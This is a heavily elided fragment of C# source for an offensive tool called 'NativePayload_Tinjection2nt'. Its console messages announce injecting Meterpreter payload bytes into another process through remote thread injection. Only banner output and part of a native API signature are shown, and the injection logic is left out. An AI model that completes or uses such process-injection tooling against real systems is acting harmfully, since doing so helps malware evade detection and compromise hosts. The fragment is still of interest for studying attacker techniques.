...
namespace NativePayload_Tinjection2nt
{
    ...
    uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
        ...
        static void Main(string[] args)
        {
            ...
            Console.WriteLine("Tinjection2nt experiment v3");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_Tinjection2nt , Injecting Meterpreter exec Payload bytes to Other Process");
            Console.WriteLine();
            // Console.ReadKey();
            /// step I
            ...
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Remote Thread Injection Method v 3");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
